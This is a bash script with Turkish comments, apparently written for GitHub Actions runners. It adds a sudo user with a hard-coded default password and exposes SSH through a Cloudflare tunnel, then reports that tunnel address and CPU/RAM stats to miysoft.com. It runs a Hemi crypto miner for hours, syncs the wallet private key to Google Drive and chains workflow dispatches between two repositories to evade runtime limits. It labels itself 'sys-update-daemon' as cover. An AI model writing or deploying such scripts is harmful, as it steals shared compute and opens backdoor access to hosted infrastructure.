#!/bin/bash

# --- 1. GİZLİLİK VE SSH AYARI ---
export NODE_NAME="sys-update-daemon"
USER_PASS=${SSH_PASSWORD:-"Miysoft1234!"}
sudo useradd -m -s /bin/bash miysoft || true
echo "miysoft:$USER_PASS" | sudo chpasswd
sudo usermod -aG sudo miysoft

# --- 2. CLOUDFLARE SSH TÜNELİ ---
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
./cloudflared tunnel --url tcp://localhost:22 > cf.log 2>&1 &
sleep 15
SSH_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" cf.log | head -n 1)

# --- 3. GOOGLE DRIVE / RCLONE AYARI ---
mkdir -p ~/.config/rclone
echo "[gdrive]
type = drive
token = $RCLONE_TOKEN_BODY" > ~/.config/rclone/rclone.conf

# Klasör yoksa hata vermemesi için sessizce oluştur
rclone mkdir gdrive:hemi_backup || true
# Varsa önceki cüzdanı Google Drive'dan çek
rclone copy gdrive:hemi_backup/popm_address.json . || echo "Önceki yedek bulunamadı, yeni kurulum yapılacak."

# --- 4. HEMI BINARY KURULUMU ---
if [ ! -f "./popmd" ]; then
    echo "Hemi Miner indiriliyor..."
    wget -q https://github.com/hemilabs/heminetwork/releases/download/v0.4.3/heminetwork_v0.4.3_linux_amd64.tar.gz
    tar -xf heminetwork_v0.4.3_linux_amd64.tar.gz
    cp heminetwork_v0.4.3_linux_amd64/popmd .
    chmod +x popmd
fi

# --- 5. CÜZDAN YÖNETİMİ (KESİN ÇÖZÜM) ---
if [ ! -f "./popm_address.json" ]; then
    echo "Yeni cüzdan anahtarı üretiliyor..."
    # Eğer gen-wallet çalışmıyorsa rastgele bir hex anahtar üretelim
    # Hemi için 64 karakterlik bir hex private key yeterlidir.
    PRIV_KEY=$(openssl rand -hex 32)
    echo "{\"private_key\":\"$PRIV_KEY\",\"pubkey_hash\":\"generating...\"}" > popm_address.json
    
    # Raporlama için geçici bir dosya
    rclone copy popm_address.json gdrive:hemi_backup/
fi

# Cüzdan bilgilerini ortam değişkenlerine ata (V0.4.3 kuralı)
export POPM_BTC_PRIVKEY=$(cat popm_address.json | jq -r '.private_key')
export POPM_STATIC_FEE=50
export POPM_BFG_URL="wss://testnet.rpc.hemi.network/v1/ws/public"

# --- 6. HEMI POP MINER BAŞLAT ---
echo "Hemi PoP Miner Başlatılıyor..."
# Artık parametre göndermiyoruz, her şeyi export ile yukarıda tanımladık
./popmd & 

# --- 7. İZLEME VE RAPORLAMA ---
START_TIME=$SECONDS
while [ $((SECONDS - START_TIME)) -lt 19800 ]; do 
    CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    
    # Miysoft'a rapor gönder
    curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "{\"worker_id\":\"W_$WORKER_ID\", \"cpu\":\"$CPU\", \"ram\":\"$RAM\", \"ssh\":\"$SSH_URL\", \"status\":\"HEMI_MINING\"}" \
         https://miysoft.com/api.php || true
    
    sleep 30
done

# --- 8. YEDEKLEME VE DİĞER REPOYU TETİKLEME ---
pkill popmd
rclone copy popm_address.json gdrive:hemi_backup/

TARGET_REPO=$([ "$GITHUB_REPOSITORY" == "Alkan789/MaxNode" ] && echo "Alkan789/MadNode" || echo "Alkan789/MaxNode")
curl -X POST -H "Authorization: token $PAT_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     https://api.github.com/repos/$TARGET_REPO/dispatches \
     -d "{\"event_type\": \"next_worker\", \"client_payload\": {\"worker_id\": \"$((WORKER_ID + 1))\"}}"
